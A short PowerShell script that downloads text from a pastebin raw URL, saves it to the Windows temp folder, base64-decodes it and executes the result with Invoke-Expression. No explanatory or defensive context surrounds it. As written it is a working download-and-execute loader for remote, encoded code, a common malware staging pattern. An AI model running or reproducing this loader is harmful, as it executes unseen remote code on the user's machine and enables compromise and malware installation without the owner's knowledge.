$wc = new-object System.Net.WebClient

$wc.DownloadString("http://pastebin.com/raw/90MVHxja") | out-file c:\Windows\temp\henneko.txt

$File = Get-Content -Path "C:\Windows\Temp\henneko.txt"

Write-Host $File

$enc = [System.Text.Encoding]::UTF8
$string = $enc.GetString([System.Convert]::FromBase64String($File))

Write-Host $string

Invoke-Expression -Command "$string"
